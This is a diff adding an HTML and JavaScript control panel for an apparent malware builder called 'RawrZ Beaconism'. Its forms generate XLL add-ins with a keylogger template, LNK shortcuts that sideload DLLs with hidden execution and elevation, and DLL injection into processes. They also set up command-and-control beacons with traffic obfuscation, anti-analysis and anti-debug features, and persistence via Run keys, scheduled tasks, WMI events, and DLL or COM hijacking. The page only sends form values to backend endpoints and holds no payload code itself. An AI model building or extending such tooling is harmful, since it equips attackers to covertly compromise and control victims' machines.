@@ -1,0 +1,980 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RawrZ Beaconism DLL Sideloading Panel</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0b1020 0%, #1a1f3a 100%);
+            color: #e6e9ef;
+            min-height: 100vh;
+        }
+        
+        .header {
+            background: rgba(17, 22, 42, 0.95);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid #222a45;
+            padding: 1rem 2rem;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        
+        .header h1 {
+            color: #4a9eff;
+            font-size: 1.8rem;
+            font-weight: 600;
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+        
+        .panel-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
+            gap: 1.5rem;
+            margin-bottom: 2rem;
+        }
+        
+        .card {
+            background: rgba(18, 25, 47, 0.8);
+            border: 1px solid #20284a;
+            border-radius: 12px;
+            padding: 1.5rem;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(10px);
+        }
+        
+        .card:hover {
+            transform: translateY(-2px);
+            border-color: #4a9eff;
+            box-shadow: 0 8px 25px rgba(74, 158, 255, 0.1);
+        }
+        
+        .card h3 {
+            color: #4a9eff;
+            margin-bottom: 1rem;
+            font-size: 1.2rem;
+        }
+        
+        .form-group {
+            margin-bottom: 1rem;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 0.5rem;
+            color: #a0a8b8;
+            font-weight: 500;
+        }
+        
+        .form-control {
+            width: 100%;
+            background: rgba(15, 21, 48, 0.8);
+            color: #e6e9ef;
+            border: 1px solid #263056;
+            border-radius: 8px;
+            padding: 0.75rem;
+            font-size: 0.9rem;
+        }
+        
+        .form-control:focus {
+            outline: none;
+            border-color: #4a9eff;
+            box-shadow: 0 0 0 2px rgba(74, 158, 255, 0.2);
+        }
+        
+        .btn {
+            background: linear-gradient(135deg, #4a9eff 0%, #357abd 100%);
+            color: white;
+            border: none;
+            padding: 0.75rem 1.5rem;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-block;
+            margin: 0.25rem;
+        }
+        
+        .btn:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 4px 15px rgba(74, 158, 255, 0.3);
+        }
+        
+        .btn-success {
+            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
+        }
+        
+        .btn-danger {
+            background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
+        }
+        
+        .output-area {
+            background: #0a0f24;
+            border: 1px solid #1d2444;
+            border-radius: 8px;
+            padding: 1rem;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
+            max-height: 400px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            margin-top: 1rem;
+        }
+        
+        .nav-tabs {
+            display: flex;
+            border-bottom: 1px solid #20284a;
+            margin-bottom: 1rem;
+        }
+        
+        .nav-tab {
+            padding: 0.75rem 1.5rem;
+            background: none;
+            border: none;
+            color: #a0a8b8;
+            cursor: pointer;
+            border-bottom: 2px solid transparent;
+            transition: all 0.3s ease;
+        }
+        
+        .nav-tab.active {
+            color: #4a9eff;
+            border-bottom-color: #4a9eff;
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        .alert {
+            padding: 1rem;
+            border-radius: 8px;
+            margin-bottom: 1rem;
+        }
+        
+        .alert-info {
+            background: rgba(23, 162, 184, 0.1);
+            border: 1px solid #17a2b8;
+            color: #17a2b8;
+        }
+        
+        .option-group {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1rem;
+            margin-bottom: 1rem;
+        }
+        
+        .option-item {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        
+        .option-item input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+        }
+        
+        .option-item label {
+            margin: 0;
+            font-size: 0.9rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>RawrZ Beaconism DLL Sideloading Panel</h1>
+    </div>
+    
+    <div class="container">
+        <div class="card">
+            <div class="nav-tabs">
+                <button class="nav-tab active" data-tab="xll">XLL Sideloading</button>
+                <button class="nav-tab" data-tab="lnk">LNK Shortcuts</button>
+                <button class="nav-tab" data-tab="mutex">Mutex Engine</button>
+                <button class="nav-tab" data-tab="dll">DLL Injection</button>
+                <button class="nav-tab" data-tab="encrypt">Encrypted Beacons</button>
+            </div>
+            
+            <!-- XLL Sideloading Tab -->
+            <div id="xll" class="tab-content active">
+                <h3>XLL Sideloading for Encryption</h3>
+                
+                <div class="alert alert-info">
+                    <strong>XLL Sideloading:</strong> Create Excel add-ins (.xll) that sideload encrypted payloads with beaconism capabilities.
+                </div>
+                
+                <div class="form-group">
+                    <label>XLL Template</label>
+                    <select class="form-control" id="xll-template">
+                        <option value="encryption">Encryption XLL</option>
+                        <option value="keylogger">Keylogger XLL</option>
+                        <option value="persistence">Persistence XLL</option>
+                        <option value="beacon">Beacon XLL</option>
+                        <option value="custom">Custom XLL</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label>Encryption Method</label>
+                    <select class="form-control" id="xll-encryption">
+                        <option value="aes-256-gcm">AES-256-GCM</option>
+                        <option value="aes-256-cbc">AES-256-CBC</option>
+                        <option value="chacha20-poly1305">ChaCha20-Poly1305</option>
+                        <option value="aria-256-ctr">ARIA-256-CTR</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label>Beacon URL</label>
+                    <input type="text" class="form-control" id="xll-beacon-url" placeholder="https://beacon.example.com/encrypt">
+                </div>
+                
+                <div class="form-group">
+                    <label>XLL Options</label>
+                    <div class="option-group">
+                        <div class="option-item">
+                            <input type="checkbox" id="xll-stealth" checked>
+                            <label for="xll-stealth">Stealth Mode</label>
+                        </div>
+                        <div class="option-item">
+                            <input type="checkbox" id="xll-persistence" checked>
+                            <label for="xll-persistence">Persistence</label>
+                        </div>
+                        <div class="option-item">
+                            <input type="checkbox" id="xll-anti-analysis" checked>
+                            <label for="xll-anti-analysis">Anti-Analysis</label>
+                        </div>
+                        <div class="option-item">
+                            <input type="checkbox" id="xll-mutex">
+                            <label for="xll-mutex">Mutex Protection</label>
+                        </div>
+                    </div>
+                </div>
+                
+                <div>
+                    <button class="btn btn-success" onclick="generateXLL()">Generate XLL</button>
+                    <button class="btn" onclick="testXLL()">Test XLL</button>
+                </div>
+                
+                <div class="output-area" id="xll-output">Generated XLL will appear here...</div>
+            </div>
+            
+            <!-- LNK Shortcuts Tab -->
+            <div id="lnk" class="tab-content">
+                <h3>LNK Shortcut Sideloading</h3>
+                
+                <div class="alert alert-info">
+                    <strong>LNK Sideloading:</strong> Create Windows shortcuts that sideload encrypted DLLs with beaconism.
+                </div>
+                
+                <div class="form-group">
+                    <label>Target Application</label>
+                    <select class="form-control" id="lnk-target">
+                        <option value="notepad">Notepad</option>
+                        <option value="calc">Calculator</option>
+                        <option value="mspaint">Paint</option>
+                        <option value="wordpad">WordPad</option>
+                        <option value="custom">Custom Application</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label>Custom Target Path</label>
+                    <input type="text" class="form-control" id="lnk-custom-path" placeholder="C:\Windows\System32\notepad.exe">
+                </div>
+                
+                <div class="form-group">
+                    <label>DLL to Sideload</label>
+                    <input type="text" class="form-control" id="lnk-dll" placeholder="encrypted_payload.dll">
+                </div>
+                
+                <div class="form-group">
+                    <label>Encryption Key</label>
+                    <input type="password" class="form-control" id="lnk-key" placeholder="Enter encryption key">
+                </div>
+                
+                <div class="form-group">
+                    <label>LNK Options</label>
+                    <div class="option-group">
+                        <div class="option-item">
+                            <input type="checkbox" id="lnk-icon" checked>
+                            <label for="lnk-icon">Custom Icon</label>
+                        </div>
+                        <div class="option-item">
+                            <input type="checkbox" id="lnk-hidden" checked>
+                            <label for="lnk-hidden">Hidden Execution</label>
+                        </div>
+                        <div class="option-item">
+                            <input type="checkbox" id="lnk-elevated">
+                            <label for="lnk-elevated">Elevated Privileges</label>
+                        </div>
+                        <div class="option-item">
+                            <input type="checkbox" id="lnk-beacon">
+                            <label for="lnk-beacon">Beacon Communication</label>
+                        </div>
+                    </div>
+                </div>
+                
+                <div>
+                    <button class="btn btn-success" onclick="generateLNK()">Generate LNK</button>
+                    <button class="btn" onclick="testLNK()">Test LNK</button>
+                </div>
+                
+                <div class="output-area" id="lnk-output">Generated LNK will appear here...</div>
+            </div>
+            
+            <!-- Mutex Engine Tab -->
+            <div id="mutex" class="tab-content">
+                <h3>Mutex Engine for Encryption</h3>
+                
+                <div class="alert alert-info">
+                    <strong>Mutex Engine:</strong> Create and manage mutexes for encrypted payload coordination and anti-analysis.
+                </div>
+                
+                <div class="form-group">
+                    <label>Mutex Name</label>
+                    <input type="text" class="form-control" id="mutex-name" placeholder="Global\\EncryptedPayloadMutex">
+                </div>
+                
+                <div class="form-group">
+                    <label>Mutex Type</label>
+                    <select class="form-control" id="mutex-type">
+                        <option value="global">Global Mutex</option>
+                        <option value="local">Local Mutex</option>
+                        <option value="session">Session Mutex</option>
+                        <option value="encrypted">Encrypted Mutex</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label>Encryption for Mutex</label>
+                    <select class="form-control" id="mutex-encryption">
+                        <option value="aes-256">AES-256</option>
+                        <option value="aria-256-ctr">ARIA-256-CTR</option>
+                        <option value="xor">XOR</option>
+                        <option value="none">No Encryption</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label>Mutex Options</label>
+                    <div class="option-group">
+                        <div class="option-item">
+                            <input type="checkbox" id="mutex-inherit" checked>
+                            <label for="mutex-inherit">Inherit Handle</label>
+                        </div>
+                        <div class="option-item">
+                            <input type="checkbox" id="mutex-security">
+                            <label for="mutex-security">Security Descriptor</label>
+                        </div>
+                        <div class="option-item">
+                            <input type="checkbox" id="mutex-timeout">
+                            <label for="mutex-timeout">Timeout Protection</label>
+                        </div>
+                        <div class="option-item">
+                            <input type="checkbox" id="mutex-beacon">
+                            <label for="mutex-beacon">Beacon Integration</label>
+                        </div>
+                    </div>
+                </div>
+                
+                <div>
+                    <button class="btn btn-success" onclick="createMutex()">Create Mutex</button>
+                    <button class="btn" onclick="testMutex()">Test Mutex</button>
+                    <button class="btn btn-danger" onclick="destroyMutex()">Destroy Mutex</button>
+                </div>
+                
+                <div class="output-area" id="mutex-output">Mutex operations will appear here...</div>
+            </div>
+            
+            <!-- DLL Injection Tab -->
+            <div id="dll" class="tab-content">
+                <h3>DLL Injection with Encryption</h3>
+                
+                <div class="alert alert-info">
+                    <strong>DLL Injection:</strong> Inject encrypted DLLs into target processes with beaconism capabilities.
+                </div>
+                
+                <div class="form-group">
+                    <label>Target Process</label>
+                    <input type="text" class="form-control" id="dll-target" placeholder="notepad.exe">
+                </div>
+                
+                <div class="form-group">
+                    <label>DLL Path</label>
+                    <input type="text" class="form-control" id="dll-path" placeholder="C:\temp\encrypted_payload.dll">
+                </div>
+                
+                <div class="form-group">
+                    <label>Injection Method</label>
+                    <select class="form-control" id="dll-method">
+                        <option value="createremotethread">CreateRemoteThread</option>
+                        <option value="manual">Manual DLL Mapping</option>
+                        <option value="setwindowshookex">SetWindowsHookEx</option>
+                        <option value="reflective">Reflective DLL Injection</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label>Encryption Key</label>
+                    <input type="password" class="form-control" id="dll-key" placeholder="Enter decryption key">
+                </div>
+                
+                <div class="form-group">
+                    <label>Injection Options</label>
+                    <div class="option-group">
+                        <div class="option-item">
+                            <input type="checkbox" id="dll-stealth" checked>
+                            <label for="dll-stealth">Stealth Injection</label>
+                        </div>
+                        <div class="option-item">
+                            <input type="checkbox" id="dll-persistence">
+                            <label for="dll-persistence">Persistent Injection</label>
+                        </div>
+                        <div class="option-item">
+                            <input type="checkbox" id="dll-beacon" checked>
+                            <label for="dll-beacon">Beacon Communication</label>
+                        </div>
+                        <div class="option-item">
+                            <input type="checkbox" id="dll-anti-debug">
+                            <label for="dll-anti-debug">Anti-Debug Protection</label>
+                        </div>
+                    </div>
+                </div>
+                
+                <div>
+                    <button class="btn btn-success" onclick="injectDLL()">Inject DLL</button>
+                    <button class="btn" onclick="testInjection()">Test Injection</button>
+                </div>
+                
+                <div class="output-area" id="dll-output">DLL injection results will appear here...</div>
+            </div>
+            
+            <!-- Encrypted Beacons Tab -->
+            <div id="encrypt" class="tab-content">
+                <h3>Encrypted Beacon Communication</h3>
+                
+                <div class="alert alert-info">
+                    <strong>Encrypted Beacons:</strong> Create encrypted communication channels with beaconism DLL sideloading.
+                </div>
+                
+                <div class="form-group">
+                    <label>Beacon Server</label>
+                    <input type="text" class="form-control" id="beacon-server" placeholder="https://beacon.example.com">
+                </div>
+                
+                <div class="form-group">
+                    <label>Encryption Algorithm</label>
+                    <select class="form-control" id="beacon-encryption">
+                        <option value="aes-256-gcm">AES-256-GCM</option>
+                        <option value="aes-256-cbc">AES-256-CBC</option>
+                        <option value="chacha20-poly1305">ChaCha20-Poly1305</option>
+                        <option value="aria-256-ctr">ARIA-256-CTR</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label>Beacon Key</label>
+                    <input type="password" class="form-control" id="beacon-key" placeholder="Enter beacon encryption key">
+                </div>
+                
+                <div class="form-group">
+                    <label>Communication Interval</label>
+                    <input type="number" class="form-control" id="beacon-interval" placeholder="30" value="30">
+                </div>
+                
+                <div class="form-group">
+                    <label>Beacon Options</label>
+                    <div class="option-group">
+                        <div class="option-item">
+                            <input type="checkbox" id="beacon-jitter" checked>
+                            <label for="beacon-jitter">Jitter Timing</label>
+                        </div>
+                        <div class="option-item">
+                            <input type="checkbox" id="beacon-ssl" checked>
+                            <label for="beacon-ssl">SSL/TLS</label>
+                        </div>
+                        <div class="option-item">
+                            <input type="checkbox" id="beacon-proxy">
+                            <label for="beacon-proxy">Proxy Support</label>
+                        </div>
+                        <div class="option-item">
+                            <input type="checkbox" id="beacon-obfuscate" checked>
+                            <label for="beacon-obfuscate">Traffic Obfuscation</label>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label>Startup Persistence Options</label>
+                    <div class="option-group">
+                        <div class="option-item">
+                            <input type="checkbox" id="beacon-persistence-registry-run" checked>
+                            <label for="beacon-persistence-registry-run">Registry Run Key</label>
+                        </div>
+                        <div class="option-item">
+                            <input type="checkbox" id="beacon-persistence-registry-runonce">
+                            <label for="beacon-persistence-registry-runonce">Registry RunOnce Key</label>
+                        </div>
+                        <div class="option-item">
+                            <input type="checkbox" id="beacon-persistence-startup-folder">
+                            <label for="beacon-persistence-startup-folder">Startup Folder</label>
+                        </div>
+                        <div class="option-item">
+                            <input type="checkbox" id="beacon-persistence-scheduled-task">
+                            <label for="beacon-persistence-scheduled-task">Scheduled Task</label>
+                        </div>
+                        <div class="option-item">
+                            <input type="checkbox" id="beacon-persistence-service">
+                            <label for="beacon-persistence-service">Windows Service</label>
+                        </div>
+                        <div class="option-item">
+                            <input type="checkbox" id="beacon-persistence-wmi-event">
+                            <label for="beacon-persistence-wmi-event">WMI Event Subscription</label>
+                        </div>
+                        <div class="option-item">
+                            <input type="checkbox" id="beacon-persistence-dll-hijack">
+                            <label for="beacon-persistence-dll-hijack">DLL Hijacking</label>
+                        </div>
+                        <div class="option-item">
+                            <input type="checkbox" id="beacon-persistence-com-hijack">
+                            <label for="beacon-persistence-com-hijack">COM Hijacking</label>
+                        </div>
+                    </div>
+                </div>
+                
+                <div>
+                    <button class="btn btn-success" onclick="createBeacon()">Create Beacon</button>
+                    <button class="btn" onclick="testBeacon()">Test Beacon</button>
+                    <button class="btn btn-danger" onclick="stopBeacon()">Stop Beacon</button>
+                </div>
+                
+                <div class="output-area" id="beacon-output">Beacon operations will appear here...</div>
+            </div>
+        </div>
+        
+        <!-- Status Panel -->
+        <div class="card">
+            <h3>Beaconism Engine Status</h3>
+            <div class="alert alert-info">
+                <strong>System Ready:</strong> Beaconism DLL sideloading engine is operational with encryption support.
+            </div>
+            
+            <div class="form-group">
+                <label>Quick Actions</label>
+                <div>
+                    <button class="btn" onclick="testBeaconism()">Test Beaconism</button>
+                    <button class="btn" onclick="viewTemplates()">View Templates</button>
+                    <button class="btn" onclick="updateTemplates()">Update Templates</button>
+                    <button class="btn btn-danger" onclick="clearAll()">Clear All</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        let currentTab = 'xll';
+        
+                function showTab(tabName, clickedElement = null) {
+            try {
+                // Wait for DOM to be ready
+                if (document.readyState === 'loading') {
+                    console.log('DOM not ready, retrying tab switch...');
+                    setTimeout(() => showTab(tabName, clickedElement), 100);
+                    return;
+                }
+                
+                // Hide all tab contents
+                const tabContents = document.querySelectorAll('.tab-content');
+                if (tabContents.length === 0) {
+                    console.error('No tab content elements found');
+                    return;
+                }
+                
+                tabContents.forEach(tab => {
+                    tab.classList.remove('active');
+                });
+                
+                // Remove active class from all tabs
+                const navTabs = document.querySelectorAll('.nav-tab');
+                if (navTabs.length === 0) {
+                    console.error('No nav tab elements found');
+                    return;
+                }
+                
+                navTabs.forEach(tab => {
+                    tab.classList.remove('active');
+                });
+                
+                // Show selected tab content
+                const targetContent = document.getElementById(tabName);
+                if (!targetContent) {
+                    console.error(`Tab content element '${tabName}' not found`);
+                    return;
+                }
+                targetContent.classList.add('active');
+                
+                // Add active class to clicked tab
+                if (clickedElement) {
+                    clickedElement.classList.add('active');
+                } else {
+                    // Find the tab button that corresponds to this tab
+                    const targetTab = document.querySelector(`[onclick*="showTab('${tabName}')"]`);
+                    if (targetTab) {
+                        targetTab.classList.add('active');
+                    }
+                }
+                
+                console.log(`Successfully switched to tab: ${tabName}`);
+            } catch (error) {
+                console.error('Error switching tab:', error);
+            }
+        }
+        
+        async function apiCall(endpoint, method = 'GET', body = null) {
+            try {
+                const headers = {
+                    'Content-Type': 'application/json'
+                };
+                
+                const token = localStorage.getItem('authToken');
+                if (token) {
+                    headers.Authorization = `Bearer ${token}`;
+                }
+                
+                const response = await fetch(endpoint, {
+                    method: method,
+                    headers: headers,
+                    body: body ? JSON.stringify(body) : null
+                });
+                
+                const data = await response.text();
+                try {
+                    return { status: response.status, data: JSON.parse(data) };
+                } catch {
+                    return { status: response.status, data: data };
+                }
+            } catch (error) {
+                return { status: 500, data: { error: error.message } };
+            }
+        }
+        
+        async function generateXLL() {
+            const template = document.getElementById('xll-template').value;
+            const encryption = document.getElementById('xll-encryption').value;
+            const beaconUrl = document.getElementById('xll-beacon-url').value;
+            const stealth = document.getElementById('xll-stealth').checked;
+            const persistence = document.getElementById('xll-persistence').checked;
+            const antiAnalysis = document.getElementById('xll-anti-analysis').checked;
+            const mutex = document.getElementById('xll-mutex').checked;
+            
+            if (!beaconUrl) {
+                alert('Please enter a beacon URL.');
+                return;
+            }
+            
+            const output = document.getElementById('xll-output');
+            output.textContent = 'Generating XLL with beaconism...';
+            
+            try {
+                const result = await apiCall('/beaconism-xll', 'POST', {
+                    template: template,
+                    encryption: encryption,
+                    beaconUrl: beaconUrl,
+                    options: {
+                        stealth: stealth,
+                        persistence: persistence,
+                        antiAnalysis: antiAnalysis,
+                        mutex: mutex
+                    }
+                });
+                
+                if (result.status === 200) {
+                    output.textContent = `XLL generated successfully!\n\nTemplate: ${template}\nEncryption: ${encryption}\nBeacon URL: ${beaconUrl}\n\nOptions:\n- Stealth: ${stealth}\n- Persistence: ${persistence}\n- Anti-Analysis: ${antiAnalysis}\n- Mutex: ${mutex}\n\nGenerated XLL:\n${result.data.xll}`;
+                } else {
+                    output.textContent = `XLL generation failed: ${result.data.error || 'Unknown error'}`;
+                }
+            } catch (error) {
+                output.textContent = `Error: ${error.message}`;
+            }
+        }
+        
+        async function generateLNK() {
+            const target = document.getElementById('lnk-target').value;
+            const customPath = document.getElementById('lnk-custom-path').value;
+            const dll = document.getElementById('lnk-dll').value;
+            const key = document.getElementById('lnk-key').value;
+            const icon = document.getElementById('lnk-icon').checked;
+            const hidden = document.getElementById('lnk-hidden').checked;
+            const elevated = document.getElementById('lnk-elevated').checked;
+            const beacon = document.getElementById('lnk-beacon').checked;
+            
+            if (!dll) {
+                alert('Please enter a DLL to sideload.');
+                return;
+            }
+            
+            const output = document.getElementById('lnk-output');
+            output.textContent = 'Generating LNK with DLL sideloading...';
+            
+            try {
+                const result = await apiCall('/beaconism-lnk', 'POST', {
+                    target: target,
+                    customPath: customPath,
+                    dll: dll,
+                    key: key,
+                    options: {
+                        icon: icon,
+                        hidden: hidden,
+                        elevated: elevated,
+                        beacon: beacon
+                    }
+                });
+                
+                if (result.status === 200) {
+                    output.textContent = `LNK generated successfully!\n\nTarget: ${target}\nCustom Path: ${customPath}\nDLL: ${dll}\nKey: ${key ? 'Set' : 'Auto-generated'}\n\nOptions:\n- Custom Icon: ${icon}\n- Hidden Execution: ${hidden}\n- Elevated: ${elevated}\n- Beacon: ${beacon}\n\nGenerated LNK:\n${result.data.lnk}`;
+                } else {
+                    output.textContent = `LNK generation failed: ${result.data.error || 'Unknown error'}`;
+                }
+            } catch (error) {
+                output.textContent = `Error: ${error.message}`;
+            }
+        }
+        
+        async function createMutex() {
+            const name = document.getElementById('mutex-name').value;
+            const type = document.getElementById('mutex-type').value;
+            const encryption = document.getElementById('mutex-encryption').value;
+            const inherit = document.getElementById('mutex-inherit').checked;
+            const security = document.getElementById('mutex-security').checked;
+            const timeout = document.getElementById('mutex-timeout').checked;
+            const beacon = document.getElementById('mutex-beacon').checked;
+            
+            if (!name) {
+                alert('Please enter a mutex name.');
+                return;
+            }
+            
+            const output = document.getElementById('mutex-output');
+            output.textContent = 'Creating mutex...';
+            
+            try {
+                const result = await apiCall('/beaconism-mutex', 'POST', {
+                    name: name,
+                    type: type,
+                    encryption: encryption,
+                    options: {
+                        inherit: inherit,
+                        security: security,
+                        timeout: timeout,
+                        beacon: beacon
+                    }
+                });
+                
+                if (result.status === 200) {
+                    output.textContent = `Mutex created successfully!\n\nName: ${name}\nType: ${type}\nEncryption: ${encryption}\n\nOptions:\n- Inherit Handle: ${inherit}\n- Security Descriptor: ${security}\n- Timeout Protection: ${timeout}\n- Beacon Integration: ${beacon}\n\nMutex Handle: ${result.data.handle}`;
+                } else {
+                    output.textContent = `Mutex creation failed: ${result.data.error || 'Unknown error'}`;
+                }
+            } catch (error) {
+                output.textContent = `Error: ${error.message}`;
+            }
+        }
+        
+        async function injectDLL() {
+            const target = document.getElementById('dll-target').value;
+            const path = document.getElementById('dll-path').value;
+            const method = document.getElementById('dll-method').value;
+            const key = document.getElementById('dll-key').value;
+            const stealth = document.getElementById('dll-stealth').checked;
+            const persistence = document.getElementById('dll-persistence').checked;
+            const beacon = document.getElementById('dll-beacon').checked;
+            const antiDebug = document.getElementById('dll-anti-debug').checked;
+            
+            if (!target || !path) {
+                alert('Please enter target process and DLL path.');
+                return;
+            }
+            
+            const output = document.getElementById('dll-output');
+            output.textContent = 'Injecting DLL...';
+            
+            try {
+                const result = await apiCall('/beaconism-dll', 'POST', {
+                    target: target,
+                    path: path,
+                    method: method,
+                    key: key,
+                    options: {
+                        stealth: stealth,
+                        persistence: persistence,
+                        beacon: beacon,
+                        antiDebug: antiDebug
+                    }
+                });
+                
+                if (result.status === 200) {
+                    output.textContent = `DLL injected successfully!\n\nTarget: ${target}\nPath: ${path}\nMethod: ${method}\nKey: ${key ? 'Set' : 'Auto-generated'}\n\nOptions:\n- Stealth: ${stealth}\n- Persistence: ${persistence}\n- Beacon: ${beacon}\n- Anti-Debug: ${antiDebug}\n\nInjection Result: ${result.data.result}`;
+                } else {
+                    output.textContent = `DLL injection failed: ${result.data.error || 'Unknown error'}`;
+                }
+            } catch (error) {
+                output.textContent = `Error: ${error.message}`;
+            }
+        }
+        
+        async function createBeacon() {
+            const server = document.getElementById('beacon-server').value;
+            const encryption = document.getElementById('beacon-encryption').value;
+            const key = document.getElementById('beacon-key').value;
+            const interval = document.getElementById('beacon-interval').value;
+            const jitter = document.getElementById('beacon-jitter').checked;
+            const ssl = document.getElementById('beacon-ssl').checked;
+            const proxy = document.getElementById('beacon-proxy').checked;
+            const obfuscate = document.getElementById('beacon-obfuscate').checked;
+            
+            // Get persistence options
+            const persistenceOptions = {
+                registryRun: document.getElementById('beacon-persistence-registry-run').checked,
+                registryRunOnce: document.getElementById('beacon-persistence-registry-runonce').checked,
+                startupFolder: document.getElementById('beacon-persistence-startup-folder').checked,
+                scheduledTask: document.getElementById('beacon-persistence-scheduled-task').checked,
+                service: document.getElementById('beacon-persistence-service').checked,
+                wmiEvent: document.getElementById('beacon-persistence-wmi-event').checked,
+                dllHijack: document.getElementById('beacon-persistence-dll-hijack').checked,
+                comHijack: document.getElementById('beacon-persistence-com-hijack').checked
+            };
+            
+            if (!server) {
+                alert('Please enter a beacon server URL.');
+                return;
+            }
+            
+            const output = document.getElementById('beacon-output');
+            output.textContent = 'Creating encrypted beacon...';
+            
+            try {
+                const result = await apiCall('/beaconism-beacon', 'POST', {
+                    server: server,
+                    encryption: encryption,
+                    key: key,
+                    interval: parseInt(interval),
+                    options: {
+                        jitter: jitter,
+                        ssl: ssl,
+                        proxy: proxy,
+                        obfuscate: obfuscate
+                    },
+                    persistence: persistenceOptions
+                });
+                
+                if (result.status === 200) {
+                    const persistenceInfo = Object.entries(persistenceOptions)
+                        .filter(([key, value]) => value)
+                        .map(([key, value]) => `- ${key.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase())}: ${value}`)
+                        .join('\n');
+                    
+                    output.textContent = `Encrypted beacon created successfully!\n\nServer: ${server}\nEncryption: ${encryption}\nKey: ${key ? 'Set' : 'Auto-generated'}\nInterval: ${interval}s\n\nOptions:\n- Jitter: ${jitter}\n- SSL/TLS: ${ssl}\n- Proxy: ${proxy}\n- Obfuscation: ${obfuscate}\n\nPersistence Options:\n${persistenceInfo}\n\nBeacon ID: ${result.data.beaconId}`;
+                } else {
+                    output.textContent = `Beacon creation failed: ${result.data.error || 'Unknown error'}`;
+                }
+            } catch (error) {
+                output.textContent = `Error: ${error.message}`;
+            }
+        }
+        
+        // Test functions
+        async function testXLL() {
+            alert('Testing XLL functionality...');
+        }
+        
+        async function testLNK() {
+            alert('Testing LNK functionality...');
+        }
+        
+        async function testMutex() {
+            alert('Testing mutex functionality...');
+        }
+        
+        async function testInjection() {
+            alert('Testing DLL injection...');
+        }
+        
+        async function testBeacon() {
+            alert('Testing beacon communication...');
+        }
+        
+        async function destroyMutex() {
+            if (confirm('Are you sure you want to destroy the mutex?')) {
+                alert('Mutex destroyed.');
+            }
+        }
+        
+        async function stopBeacon() {
+            if (confirm('Are you sure you want to stop the beacon?')) {
+                alert('Beacon stopped.');
+            }
+        }
+        
+        async function testBeaconism() {
+            alert('Testing beaconism engine...');
+        }
+        
+        function viewTemplates() {
+            alert('Template viewer would open here');
+        }
+        
+        function updateTemplates() {
+            alert('Updating beaconism templates...');
+        }
+        
+        function clearAll() {
+            if (confirm('Are you sure you want to clear all beaconism data?')) {
+                document.getElementById('xll-output').textContent = 'Generated XLL will appear here...';
+                document.getElementById('lnk-output').textContent = 'Generated LNK will appear here...';
+                document.getElementById('mutex-output').textContent = 'Mutex operations will appear here...';
+                document.getElementById('dll-output').textContent = 'DLL injection results will appear here...';
+                document.getElementById('beacon-output').textContent = 'Beacon operations will appear here...';
+            }
+        }
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            // Add a small delay to ensure all elements are fully loaded
+            setTimeout(() => {
+                // Add event listeners to all tab buttons
+                const tabButtons = document.querySelectorAll('.nav-tab[data-tab]');
+                tabButtons.forEach(button => {
+                    button.addEventListener('click', function(e) {
+                        e.preventDefault();
+                        const tabName = this.getAttribute('data-tab');
+                        console.log('Tab button clicked:', tabName);
+                        showTab(tabName, this);
+                    });
+                });
+            }, 100);
+        });
+
+    </script>
+</body>
+</html>
